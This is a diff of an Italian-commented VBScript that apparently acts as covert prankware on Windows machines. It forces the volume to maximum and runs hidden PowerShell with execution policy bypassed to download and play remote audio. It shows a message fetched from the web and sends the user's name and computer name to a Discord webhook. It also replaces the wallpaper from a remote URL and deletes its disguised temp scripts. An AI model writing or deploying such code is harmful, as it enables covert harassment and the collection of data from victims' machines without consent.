@@ -19,18 +19,16 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%")
 nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
 
-' --- 1. CONFIGURAZIONE VOLUME (UNMUTE + MAX) ---
-' Invia il tasto Volume Mute (per assicurarsi che si "svegli" se mutato) e poi alza
+' --- 1. CONFIGURAZIONE VOLUME ---
 shell.SendKeys Chr(&hAD) 
 For i = 1 To 50
-    shell.SendKeys Chr(&hAF) ' Volume Up
+    shell.SendKeys Chr(&hAF)
 Next
 
-' --- 2. DOWNLOAD DELL'AUDIO ---
+' --- 2. DOWNLOAD AUDIO ---
 percorsoAudio = shell.ExpandEnvironmentStrings("%TEMP%") & "\audio.mp3"
 scriptDownloadAudio = shell.ExpandEnvironmentStrings("%TEMP%") & "\dl_audio.ps1"
 
-' Creiamo uno script PowerShell dedicato solo al download (più affidabile)
 Dim psDownload
 psDownload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
              "try { (New-Object System.Net.WebClient).DownloadFile('" & urlAudio & "', '" & percorsoAudio & "'); } catch {}"
@@ -40,18 +38,14 @@ Set fAudio = fso.CreateTextFile(scriptDownloadAudio, True)
 fAudio.Write psDownload
 fAudio.Close
 
-' Eseguiamo il download e attendiamo che finisca (True)
 shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptDownloadAudio & """", 0, True
 
-' --- 3. RIPRODUZIONE AUDIO DIRETTA ---
-' Usiamo direttamente l'eseguibile wmplayer.exe.
-' Il numero 7 alla fine significa "ShowMinNoActive" (Ridotto a icona e senza focus)
-' Questo bypassa la richiesta "Apri con" perché chiamiamo l'EXE direttamente.
+' --- 3. RIPRODUZIONE AUDIO ---
 If fso.FileExists(percorsoAudio) Then
     shell.Run "wmplayer.exe """ & percorsoAudio & """ /Play", 7, False
 End If
 
-' --- 4. RECUPERA IL MESSAGGIO ---
+' --- 4. RECUPERA MESSAGGIO ---
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 xmlHttp.Open "GET", urlMessaggio, False
 xmlHttp.Send
@@ -59,7 +53,7 @@ If xmlHttp.Status = 200 Then
     messaggioDalWeb = Trim(xmlHttp.responseText)
 End If
 
-' --- 5. MOSTRA IL POPUP E INVIA NOTIFICA ---
+' --- 5. POPUP E NOTIFICA ---
 If messaggioDalWeb <> "" Then
     Dim comandoPopup
     comandoPopup = "powershell -WindowStyle Hidden -NoProfile -Command ""Add-Type -AssemblyName System.Windows.Forms; " & _
@@ -71,21 +65,27 @@ If messaggioDalWeb <> "" Then
         "$btn = New-Object System.Windows.Forms.Button; $btn.Text = 'OK'; $btn.Left = 160; $btn.Top = 10; $btn.Add_Click({$form.Close()}); " & _
         "$panel.Controls.Add($btn); $form.Controls.Add($panel); $form.ShowDialog() | Out-Null"""
     
-    ' Mostra il popup (il codice attende la chiusura con True)
     shell.Run comandoPopup, 0, True
-    
-    ' Invia notifica Discord
     InviaNotificaDiscordPS webhookURL, nomeUtente, nomePC, messaggioDalWeb
 End If
 
-' --- 6. CAMBIO SFONDO ---
+' --- 6. CAMBIO SFONDO (CON RITARDO) ---
+' Definiamo il percorso fisso
 percorsoLocaleImg = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\bg_data.jpg"
 percorsoScriptWp = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_task.ps1"
 
+' Logica modificata:
+' 1. CANCELLA la vecchia immagine (se esiste).
+' 2. SCARICA la nuova.
+' 3. ASPETTA (Start-Sleep -Seconds 3) per essere sicuri che il file sia scritto e sbloccato.
+' 4. IMPOSTA lo sfondo.
+
 scriptWp = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { " & _
+    "if (Test-Path '" & percorsoLocaleImg & "') { Remove-Item '" & percorsoLocaleImg & "' -Force; Start-Sleep -Milliseconds 500; } " & _
     "(New-Object System.Net.WebClient).DownloadFile('" & urlImmagine & "', '" & percorsoLocaleImg & "'); " & _
+    "Start-Sleep -Seconds 3; " & _
     "if (Test-Path '" & percorsoLocaleImg & "') { " & _
-    "$path = (Get-Item '" & percorsoLocaleImg & "').FullName; " & _
+    "$path = '" & percorsoLocaleImg & "'; " & _
     "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $path; " & _
     "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'; " & _
     "$code = @' " & vbCrLf & _
@@ -104,8 +104,7 @@ shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ 
 WScript.Sleep 3000
 If fso.FileExists(percorsoScriptWp) Then fso.DeleteFile percorsoScriptWp
 If fso.FileExists(scriptDownloadAudio) Then fso.DeleteFile scriptDownloadAudio
-' NOTA: Non cancelliamo l'audio subito altrimenti smette di suonare mentre il popup è aperto.
-' Si può aggiungere una pulizia all'avvio successivo o lasciarlo in TEMP.
+
 
 ' --- FUNZIONE NOTIFICA DISCORD ---
 Sub InviaNotificaDiscordPS(webhook, utente, pc, messaggio)
